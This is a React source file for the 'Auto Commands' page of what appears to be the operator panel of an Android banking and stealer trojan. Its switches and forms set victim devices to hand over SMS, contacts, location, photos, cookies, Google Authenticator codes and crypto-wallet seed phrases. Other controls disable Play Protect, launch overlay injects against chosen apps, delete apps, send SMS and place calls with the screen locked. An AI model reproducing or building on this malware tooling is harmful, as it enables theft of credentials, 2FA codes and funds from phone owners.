import React, {useLayoutEffect} from "react";
import {Button, Checkbox, Col, Divider, Form, Input, Row, Switch} from "antd";

import {customStyles, customStylesLight} from "../../../Util/config";
import CreatableSelect from "react-select/creatable";
import {AppState} from "../../../Store/RootReducer";
import TextArea from "antd/es/input/TextArea";


import {updateAutoCommands} from "../../../Store/AutoCommands/Actions";
import getAutoCommands from "../../../Requests/AutoCommands/GetAutoCommandsRequest";
import {useTranslation} from "react-i18next";
import Spinner from "../../Misc/Spinner";
import {useAppDispatch} from "../../../Hook/useAppDispatch";
import {useAppSelector} from "../../../Hook/useAppSelector";

interface SelectFields {
    label: string,
    value: string,
}

const AutoCommands: React.FC = () => {
    const [form] = Form.useForm();
    const dispatch = useAppDispatch();
    const acReducer = useAppSelector((state: AppState) => state.autoCommands);
    const {t} = useTranslation();

    const filtersReducer = useAppSelector((state: AppState) => state.filters);

    const options: SelectFields[] = [];

    Object.keys(filtersReducer.injections).map((application: string) => {
        options.push({
            label: application,
            value: application,
        });
    });

    const settingsReducer = useAppSelector((state: AppState) => state.settings);

    useLayoutEffect(() => {
        if (!acReducer.isLoaded) {
            dispatch(getAutoCommands());
        } else {
            form.setFieldsValue({
                getaccounts: acReducer.getaccounts.enabled,
                getinstallapps: acReducer.getinstallapps.enabled,
                updateinjectandlistapps: acReducer.updateinjectandlistapps.enabled,
                google_auth_grabber: acReducer.googleAuthGrabber.enabled,
                calling_toggle: acReducer.calling.enabled,
                startinject: acReducer.startinject.enabled,
                push: acReducer.push.enabled,
                send_sms_toggle: acReducer.sendsms.enabled,
                seedPhrase: acReducer.seedPhrase.enabled,
                run_app_toggle: acReducer.runApp.enabled,
                deleteapplication_toggle: acReducer.deleteapplication.enabled,
                openurl_toggle: acReducer.openurl.enabled,
                calling_number: acReducer.calling.number,
                calling_lock_screen: acReducer.calling.locked,
                clearcache_toogle: acReducer.clearcache.enabled,
                clearcache: acReducer.clearcache.application !== undefined && acReducer.clearcache.application !== "" ? {
                    label: acReducer.clearcache.application,
                    value: acReducer.clearcache.application,
                } : null,
                deleteapplication: acReducer.deleteapplication.application !== undefined && acReducer.deleteapplication.application !== "" ? {
                    label: acReducer.deleteapplication.application,
                    value: acReducer.deleteapplication.application,
                } : null,
                get_seed: acReducer.seedPhrase.wallets,
                startinject_application: acReducer.startinject.application !== undefined && acReducer.startinject.application !== "" ? {
                    label: acReducer.startinject.application,
                    value: acReducer.startinject.application,
                } : null,
                openurl: acReducer.openurl.url,
                push_application: acReducer.push.application !== undefined && acReducer.push.application !== "" ? {
                    label: acReducer.push.application,
                    value: acReducer.push.application,
                } : null,
                push_text: acReducer.push.text,
                push_title: acReducer.push.title,
                run_app: acReducer.runApp.application !== undefined && acReducer.runApp.application !== "" ? {
                    label: acReducer.runApp.application,
                    value: acReducer.runApp.application,
                } : null,
                send_sms_message: acReducer.sendsms.message,
                send_sms_number: acReducer.sendsms.number,
                getcallhistory: acReducer.getcallhistory.enabled,
                getcontacts: acReducer.getcontacts.enabled,
                getlocation: acReducer.getlocation.enabled,
                getimages: acReducer.getimages.enabled,
                getsms: acReducer.getsms.enabled,
                startadmin: acReducer.startadmin.enabled,
                takescreenshot: acReducer.takescreenshot.enabled,
                startauthenticator2: acReducer.startauthenticator2.enabled,
                protect: acReducer.protect.enabled,
                cookie: acReducer.cookie.enabled,
                takephoto: acReducer.takephoto.enabled,
            });
        }
    }, [dispatch, acReducer.isLoaded]);

    const autoCommandsSave = () => {
        dispatch(updateAutoCommands({
            getaccounts: {
                enabled: form.getFieldValue("getaccounts"),
            },
            getinstallapps: {
                enabled: form.getFieldValue("getinstallapps"),
            },
            updateinjectandlistapps: {
                enabled: form.getFieldValue("updateinjectandlistapps"),
            },
            googleAuthGrabber: {
                enabled: form.getFieldValue("google_auth_grabber"),
            },
            calling: {
                enabled: form.getFieldValue("calling_toggle"),
                number: form.getFieldValue("calling_number"),
                locked: form.getFieldValue("calling_lock_screen"),
            },
            startinject: {
                enabled: form.getFieldValue("startinject"),
                application: form.getFieldValue("startinject_application")?.value ?? "",
            },
            push: {
                enabled: form.getFieldValue("push"),
                title: form.getFieldValue("push_title"),
                text: form.getFieldValue("push_text"),
                application: form.getFieldValue("push_application")?.value ?? "",
            },
            sendsms: {
                enabled: form.getFieldValue("send_sms_toggle"),
                message: form.getFieldValue("send_sms_message"),
                number: form.getFieldValue("send_sms_number"),
            },
            seedPhrase: {
                enabled: form.getFieldValue("seedPhrase"),
                wallets: form.getFieldValue("get_seed"),
            },
            clearcache: {
                enabled: form.getFieldValue("clearcache_toogle"),
                application: form.getFieldValue("clearcache")?.value ?? "",
            },
            runApp: {
                enabled: form.getFieldValue("run_app_toggle"),
                application: form.getFieldValue("run_app")?.value ?? "",
            },
            deleteapplication: {
                enabled: form.getFieldValue("deleteapplication_toggle"),
                application: form.getFieldValue("deleteapplication")?.value ?? "",
            },
            openurl: {
                enabled: form.getFieldValue("openurl_toggle"),
                url: form.getFieldValue("openurl"),
            },
            getcallhistory: {
                enabled: form.getFieldValue("getcallhistory"),
            },
            getcontacts: {
                enabled: form.getFieldValue("getcontacts"),
            },
            getlocation: {
                enabled: form.getFieldValue("getlocation"),
            },
            getimages: {
                enabled: form.getFieldValue("getimages"),
            },
            getsms: {
                enabled: form.getFieldValue("getsms"),
            },
            startadmin: {
                enabled: form.getFieldValue("startadmin"),
            },
            takescreenshot: {
                enabled: form.getFieldValue("takescreenshot"),
            },
            startauthenticator2: {
                enabled: form.getFieldValue("startauthenticator2"),
            },
            protect: {
                enabled: form.getFieldValue("protect"),
            },
            cookie: {
                enabled: form.getFieldValue("cookie"),
            },
            takephoto: {
                enabled: form.getFieldValue("takephoto"),
            },
        }));
    };

    const onClearApplication = (newValue: any, action: any) => {
        if (!newValue) {
            form.setFieldsValue({
                [action.name]: "",
            });
        }
    };

    return (
        <>
            <div className="panel-header">
                <h2 className="panel-title">
                    {t("AUTO_COMMANDS")}
                </h2>
            </div>

            <div className="panel-content">
                {acReducer.isLoaded ? (
                    <Form form={form} layout="vertical"
                        onValuesChange={(changedValues: Record<string, string>, values: any) => {
                            form.setFieldsValue({
                                ...changedValues,
                            });
                        }}>
                        <Row gutter={24}>
                            <Col xl={6} md={12} sm={24} xs={24}>
                                <div className="command-item">
                                    <div className="command-head">
                                        <div className="command-check">
                                            <Form.Item className="command-form-item" name="getcallhistory"
                                                valuePropName="checked">
                                                <Switch
                                                    checked={acReducer.getcallhistory.enabled}
                                                />
                                            </Form.Item>
                                        </div>
                                        <div className="command-name">
                                            <span>
                                                <i className="command-icon fa-solid fa-list-ul"/>
                                                {t("GET_CALL_HISTORY_COMMAND")}
                                            </span>
                                        </div>
                                    </div>
                                </div>
                            </Col>
                            <Col xl={6} md={12} sm={24} xs={24}>
                                <div className="command-item">
                                    <div className="command-head">
                                        <div className="command-check">
                                            <Form.Item className="command-form-item" name="getcontacts"
                                                valuePropName="checked">
                                                <Switch
                                                    checked={acReducer.getcontacts.enabled}
                                                />
                                            </Form.Item>
                                        </div>
                                        <div className="command-name">
                                            <span>
                                                <i className="command-icon fa-solid fa-id-card"/>
                                                {t("GET_CONTACTS_COMMAND")}
                                            </span>
                                        </div>
                                    </div>
                                </div>
                            </Col>
                            <Col xl={6} md={12} sm={24} xs={24}>
                                <div className="command-item">
                                    <div className="command-head">
                                        <div className="command-check">
                                            <Form.Item className="command-form-item" name="getaccounts"
                                                valuePropName="checked">
                                                <Switch
                                                    checked={acReducer.getaccounts.enabled}
                                                />
                                            </Form.Item>
                                        </div>
                                        <div className="command-name">
                                            <span>
                                                <i className="command-icon fa-brands fa-google-plus-square"/>
                                                {t("GET_ACCOUNTS")}
                                            </span>
                                        </div>
                                    </div>
                                </div>
                            </Col>

                            <Col xl={6} md={12} sm={24} xs={24}>
                                <div className="command-item">
                                    <div className="command-head">
                                        <div className="command-check">
                                            <Form.Item className="command-form-item" name="getlocation"
                                                valuePropName="checked">
                                                <Switch
                                                    checked={acReducer.getlocation.enabled}
                                                />
                                            </Form.Item>
                                        </div>
                                        <div className="command-name">
                                            <span>
                                                <i className="command-icon fa-solid fa-location-dot"/> {t("GET_LOCATION_COMMAND")}
                                            </span>
                                        </div>
                                    </div>
                                </div>
                            </Col>

                            <Col xl={6} md={12} sm={24} xs={24}>
                                <div className="command-item">
                                    <div className="command-head">
                                        <div className="command-check">
                                            <Form.Item className="command-form-item" name="getimages"
                                                valuePropName="checked">
                                                <Switch
                                                    checked={acReducer.getimages.enabled}
                                                />
                                            </Form.Item>
                                        </div>
                                        <div className="command-name">
                                            <span>
                                                <i className="command-icon fa-solid fa-images"/> {t("GET_IMAGES_COMMAND")}
                                            </span>
                                        </div>
                                    </div>
                                </div>
                            </Col>

                            <Col xl={6} md={12} sm={24} xs={24}>
                                <div className="command-item">
                                    <div className="command-head">
                                        <div className="command-check">
                                            <Form.Item className="command-form-item" name="getsms"
                                                valuePropName="checked">
                                                <Switch
                                                    checked={acReducer.getsms.enabled}
                                                />
                                            </Form.Item>
                                        </div>
                                        <div className="command-name">
                                            <span>
                                                <i className="command-icon fa-solid fa-envelope"/> {t("GET_SMS_COMMAND")}
                                            </span>
                                        </div>
                                    </div>
                                </div>
                            </Col>

                            <Col xl={6} md={12} sm={24} xs={24}>
                                <div className="command-item">
                                    <div className="command-head">
                                        <div className="command-check">
                                            <Form.Item className="command-form-item" name="startadmin"
                                                valuePropName="checked">
                                                <Switch
                                                    checked={acReducer.startadmin.enabled}
                                                />
                                            </Form.Item>
                                        </div>
                                        <div className="command-name">
                                            <span>
                                                <i className="command-icon fa-solid fa-user-gear"/> {t("START_ADMIN_COMMAND")}
                                            </span>
                                        </div>
                                    </div>
                                </div>
                            </Col>

                            <Col xl={6} md={12} sm={24} xs={24}>
                                <div className="command-item">
                                    <div className="command-head">
                                        <div className="command-check">
                                            <Form.Item className="command-form-item" name="takescreenshot"
                                                valuePropName="checked">
                                                <Switch
                                                    checked={acReducer.takescreenshot.enabled}
                                                />
                                            </Form.Item>
                                        </div>
                                        <div className="command-name">
                                            <span>
                                                <i className="command-icon fa-solid fa-mobile-screen"/> {t("TAKE_SCREENSHOT_COMMAND")}
                                            </span>
                                        </div>
                                    </div>
                                </div>
                            </Col>

                            <Col xl={6} md={12} sm={24} xs={24}>
                                <div className="command-item">
                                    <div className="command-head">
                                        <div className="command-check">
                                            <Form.Item className="command-form-item" name="startauthenticator2"
                                                valuePropName="checked">
                                                <Switch
                                                    checked={acReducer.startauthenticator2.enabled}
                                                />
                                            </Form.Item>
                                        </div>
                                        <div className="command-name">
                                            <span>
                                                <i className="command-icon fa-solid fa-right-to-bracket"/> {t("START_AUTHENTICATOR2_COMMAND")}
                                            </span>
                                        </div>
                                    </div>
                                </div>
                            </Col>

                            <Col xl={6} md={12} sm={24} xs={24}>
                                <div className="command-item">
                                    <div className="command-head">
                                        <div className="command-check">
                                            <Form.Item className="command-form-item" name="protect"
                                                valuePropName="checked">
                                                <Switch
                                                    checked={acReducer.protect.enabled}
                                                />
                                            </Form.Item>
                                        </div>
                                        <div className="command-name">
                                            <span>
                                                <i className="command-icon icon-seed"/> {t("OFF_PLAY_PROTECT")}
                                            </span>
                                        </div>
                                    </div>
                                </div>
                            </Col>

                            <Col xl={6} md={12} sm={24} xs={24}>
                                <div className="command-item">
                                    <div className="command-head">
                                        <div className="command-check">
                                            <Form.Item className="command-form-item" name="cookie"
                                                valuePropName="checked">
                                                <Switch
                                                    checked={acReducer.cookie.enabled}
                                                />
                                            </Form.Item>
                                        </div>
                                        <div className="command-name">
                                            <span>
                                                <i className="command-icon fa-solid fa-cookie"/> {t("Get cookie")}
                                            </span>
                                        </div>
                                    </div>
                                </div>
                            </Col>

                            <Col xl={6} md={12} sm={24} xs={24}>
                                <div className="command-item">
                                    <div className="command-head">
                                        <div className="command-check">
                                            <Form.Item className="command-form-item" name="takephoto"
                                                valuePropName="checked">
                                                <Switch
                                                    checked={acReducer.takephoto.enabled}
                                                />
                                            </Form.Item>
                                        </div>
                                        <div className="command-name">
                                            <span>
                                                <i className="command-icon fa-solid fa-camera"/> {t("Take photo")}
                                            </span>
                                        </div>
                                    </div>
                                </div>
                            </Col>

                            <Col xl={6} md={12} sm={24} xs={24}>
                                <div className="command-item">
                                    <div className="command-head">
                                        <div className="command-check">
                                            <Form.Item className="command-form-item" name="getinstallapps"
                                                valuePropName="checked">
                                                <Switch
                                                    checked={acReducer.getinstallapps.enabled}
                                                />
                                            </Form.Item>
                                        </div>
                                        <div className="command-name">
                                            <span><i
                                                className="command-icon fa-brands fa-google-play"/> {t("GET_INSTALLED_APPS")}</span>
                                        </div>
                                    </div>
                                </div>
                            </Col>

                            <Col xl={6} md={12} sm={24} xs={24}>
                                <div className="command-item">
                                    <div className="command-head">
                                        <div className="command-check">
                                            <Form.Item className="command-form-item" name="updateinjectandlistapps"
                                                valuePropName="checked">
                                                <Switch
                                                    checked={acReducer.updateinjectandlistapps.enabled}
                                                />
                                            </Form.Item>
                                        </div>
                                        <div className="command-name">
                                            <span><i
                                                className="command-icon fa-solid fa-syringe"/> {t("UPDATE_INJECTS_LIST")}</span>
                                        </div>
                                    </div>
                                </div>
                            </Col>
                            <Col xl={6} md={12} sm={24} xs={24}>
                                <div className="command-item form">
                                    <div className="command-head">
                                        <div className="command-check">
                                            <Form.Item className="command-form-item" name="startinject"
                                                valuePropName="checked">
                                                <Switch
                                                    checked={acReducer.startinject.enabled}
                                                />
                                            </Form.Item>
                                        </div>
                                        <div className="command-name">
                                            <span><i className="command-icon fa-solid fa-terminal"/> {t("OPEN_INJECT")}</span>
                                        </div>
                                    </div>
                                    <div className="command-form">
                                        <Form.Item label={t("APPLICATION")} name="startinject_application">
                                            <CreatableSelect
                                                styles={settingsReducer.theme === "light" ? customStylesLight : customStyles}
                                                options={options}
                                                isClearable
                                                onChange={onClearApplication}
                                                name="startinject_application"
                                                placeholder={t("SELECT_APP")}
                                            />
                                        </Form.Item>
                                    </div>
                                </div>
                            </Col>
                            <Col xl={6} md={12} sm={24} xs={24}>
                                <div className="command-item form">
                                    <div className="command-head">
                                        <div className="command-check">
                                            <Form.Item className="command-form-item" name="run_app_toggle"
                                                valuePropName="checked">
                                                <Switch
                                                    checked={acReducer.runApp.enabled}
                                                />
                                            </Form.Item>
                                        </div>
                                        <div className="command-name">
                                            <span><i
                                                className="command-icon fa-solid fa-terminal"/> {t("RUN_APP")}</span>
                                        </div>
                                    </div>
                                    <div className="command-form">
                                        <Form.Item label={t("APPLICATION")} name="runApp">
                                            <CreatableSelect
                                                styles={settingsReducer.theme === "light" ? customStylesLight : customStyles}
                                                options={options}
                                                isClearable
                                                onChange={onClearApplication}
                                                name="runApp"
                                                placeholder={t("SELECT_APP")}
                                            />
                                        </Form.Item>
                                    </div>
                                </div>
                            </Col>
                            <Col xl={6} md={12} sm={24} xs={24}>
                                <div className="command-item form">
                                    <div className="command-head">
                                        <div className="command-check">
                                            <Form.Item className="command-form-item" name="deleteapplication_toggle"
                                                valuePropName="checked">
                                                <Switch
                                                    checked={acReducer.deleteapplication.enabled}
                                                />
                                            </Form.Item>
                                        </div>
                                        <div className="command-name">
                                            <span><i
                                                className="command-icon fa-solid fa-trash-can-arrow-up"/> {t("DELETE_APP")}</span>
                                        </div>
                                    </div>
                                    <div className="command-form">
                                        <Form.Item label={t("APPLICATION")} name="deleteapplication">
                                            <CreatableSelect
                                                name="deleteapplication"
                                                styles={settingsReducer.theme === "light" ? customStylesLight : customStyles}
                                                options={options}
                                                isClearable
                                                onChange={onClearApplication}
                                                placeholder={t("SELECT_APP")}
                                            />
                                        </Form.Item>
                                    </div>
                                </div>
                            </Col>
                            <Col xl={6} md={12} sm={24} xs={24}>
                                <div className="command-item form">
                                    <div className="command-head">
                                        <div className="command-check">
                                            <Form.Item className="command-form-item" name="seedPhrase"
                                                valuePropName="checked">
                                                <Switch
                                                    checked={acReducer.seedPhrase.enabled}
                                                />
                                            </Form.Item>
                                        </div>
                                        <div className="command-name">
                                            <span>
                                                <i className="command-icon fa-solid fa-align-center"/> {t("GET_SEED_PHRASE")}
                                            </span>
                                        </div>
                                    </div>
                                    <div className="command-form">
                                        <Form.Item label={t("SEED_PHRASE")} name="get_seed" initialValue="trust">
                                            <Checkbox.Group>
                                                <Row>
                                                    <Col span={12}>
                                                        <Checkbox value="trust">Trust wallet</Checkbox>
                                                    </Col>
                                                    <Col span={12}>
                                                        <Checkbox value="bitcoincom">Bitcoin.com</Checkbox>
                                                    </Col>
                                                    <Col span={12}>
                                                        <Checkbox value="mycelium">MyCelium</Checkbox>
                                                    </Col>
                                                    <Col span={12}>
                                                        <Checkbox value="piuk">BlockChain</Checkbox>
                                                    </Col>
                                                    <Col span={12}>
                                                        <Checkbox value="samourai">Samourai</Checkbox>
                                                    </Col>
                                                    <Col span={12}>
                                                        <Checkbox value="toshi">Toshi</Checkbox>
                                                    </Col>
                                                </Row>
                                            </Checkbox.Group>
                                        </Form.Item>
                                    </div>
                                </div>
                            </Col>
                            <Col xl={6} md={12} sm={24} xs={24}>
                                <div className="command-item form">
                                    <div className="command-head">
                                        <div className="command-check">
                                            <Form.Item className="command-form-item" name="push"
                                                valuePropName="checked">
                                                <Switch
                                                    checked={acReducer.push.enabled}
                                                />
                                            </Form.Item>
                                        </div>
                                        <div className="command-name">
                                            <span><i
                                                className="command-icon fa-solid fa-comment-dots"/> {t("SEND_PUSH")}</span>
                                        </div>
                                    </div>
                                    <div className="command-form">
                                        <Form.Item label={t("SEND_PUSH_TITLE")} name="push_title">
                                            <Input placeholder={t("SEND_PUSH_TITLE")}/>
                                        </Form.Item>
                                        <Form.Item label={t("SEND_PUSH_TEXT")} name="push_text">
                                            <Input placeholder={t("SEND_PUSH_TEXT")}/>
                                        </Form.Item>
                                        <Form.Item label={t("APPLICATION")} name="push_application">
                                            <CreatableSelect
                                                styles={settingsReducer.theme === "light" ? customStylesLight : customStyles}
                                                options={options}
                                                isClearable
                                                onChange={onClearApplication}
                                                name="push_application"
                                                placeholder={t("SELECT_APP")}
                                            />
                                        </Form.Item>
                                    </div>
                                </div>
                            </Col>
                            <Col xl={6} md={12} sm={24} xs={24}>
                                <div className="command-item form">
                                    <div className="command-head">
                                        <div className="command-check">
                                            <Form.Item className="command-form-item" name="send_sms_toggle"
                                                valuePropName="checked">
                                                <Switch
                                                    checked={acReducer.sendsms.enabled}
                                                />
                                            </Form.Item>
                                        </div>
                                        <div className="command-name">
                                            <span><i className="command-icon fa-solid fa-comment-sms"/> {t("SEND_SMS")}</span>
                                        </div>
                                    </div>
                                    <div className="command-form">
                                        <Form.Item label={t("NUMBER")} name="send_sms_number">
                                            <Input placeholder={t("NUMBER")}/>
                                        </Form.Item>
                                        <Form.Item label={t("TYPE_MESSAGE")} name="send_sms_message">
                                            <TextArea placeholder={t("TYPE_MESSAGE")}/>
                                        </Form.Item>
                                    </div>
                                </div>
                            </Col>
                        </Row>

                        <Divider/>

                        <div style={{display: "flex", justifyContent: "center"}}>
                            <Button htmlType="submit" type="primary" onClick={autoCommandsSave} size="large">
                                {t("SAVE_AC")}
                            </Button>
                        </div>
                    </Form>
                ) : (
                    <Spinner/>
                )}
            </div>
        </>
    );
};

export default AutoCommands;
